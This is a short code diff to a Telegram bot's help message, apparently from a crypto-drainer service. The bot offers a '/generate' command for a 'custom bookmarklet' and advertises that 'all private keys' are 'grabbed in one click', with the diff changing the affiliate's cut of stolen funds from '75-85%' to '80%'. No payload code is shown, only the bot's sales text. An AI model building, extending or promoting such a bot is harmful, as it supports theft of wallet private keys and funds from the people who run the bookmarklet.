@@ -54,7 +54,7 @@ Commands:
 /generate - Get your custom bookmarklet.
 /start - This menu
 
-Compile an axiom bookmark and receive an 75-85% split. All private keys grabbed in one click.
+Compile an axiom bookmark and receive a 80% split. All private keys grabbed in one click.
   `, { parse_mode: 'Markdown' });
 });
 
